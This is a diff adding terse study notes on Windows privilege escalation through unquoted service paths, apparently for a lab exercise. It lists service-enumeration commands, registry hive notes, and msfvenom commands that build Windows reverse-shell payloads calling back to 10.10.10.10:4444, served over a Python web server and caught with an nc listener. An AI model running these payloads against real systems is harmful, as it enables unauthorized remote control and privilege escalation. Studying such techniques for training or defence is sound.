@@ -1,0 +1,49 @@
+Find User and Group : run > lusrmgr.msc
+
+cmd:
+whoami /priv
+wmic service get name,pathname | findstr /v system32
+wmic service get name,pathname | findstr /v /i system32
+wmic service get name,pathname | findstr /v /i system32 | findstr /v \"
+
+Registry: go to registry editor or run > runedit
+
+HKCR > .extention list
+HKCU > whatever the configuration we have done in current user that will store in this
+HKLM > os info, password service etc
+HK_USERS > the key contains all the user account
+HKCC > it will show hardware info 
+
+Method 01:
+ifconfig
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o reverse.msi
+python3 -m http.server 80
+nc -nvlp 4444
+
+Vulnerable Service : C:\program Files\Unquoted Path Service\Common Files\File.exe
+
+C:\program.exe
+C:\program Files\Unquoted.exe
+C:\program Files\Unquoted Path Service\Common.exe
+C:\program Files\Unquoted Path Service\Common Files\File.exe
+
+
+Sysinternals Suite : https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
+
+
+in windows:
+python -m http.server
+python -m http.server --bind:localhost
+http://localhost:8000
+http://127.0.0.1:8000
+http://[::1]:8000
+
+Links:
+https://github.com/Tib3rius/Windows-PrivEsc-Setup
+
+
+
+https://www.youtube.com/watch?v=wG36Q8HPPnA
+
+
